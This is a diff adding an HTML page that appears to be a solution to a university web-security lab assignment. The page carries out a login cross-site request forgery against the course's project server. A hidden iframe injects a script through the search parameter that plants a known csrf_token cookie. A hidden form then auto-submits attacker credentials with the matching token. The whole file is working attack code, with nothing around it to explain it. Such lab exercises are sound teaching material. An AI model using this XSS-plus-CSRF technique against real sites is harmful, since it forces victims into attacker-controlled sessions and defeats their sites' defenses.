@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>about:blank</title>
+    <script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+</head>
+
+<body>
+    <iframe name="xss-frame" style="display: none;" src="http://cs526-s18.cs.purdue.edu/project3/search?csrfdefense=1&xssdefense=0&q=%3Cscript%3Edocument.cookie%3D%22csrf_token%3D123456%22%3B%3C%2Fscript%3E"></iframe>
+
+    <form id="login" action="http://cs526-s18.cs.purdue.edu/project3/login?csrfdefense=1&xssdefense=0" method="post" target="hidden-frame"> 
+        <input name="username" value="attacker" type="hidden">
+        <input name="password" value="123456" type="hidden">
+        <input name='csrf_token' value="123456" type="hidden">
+    </form>
+
+    <iframe name="hidden-frame" style="display: none;"></iframe>
+
+    <script>
+        $("#login").submit();
+    </script>
+</body>
+
+</html>
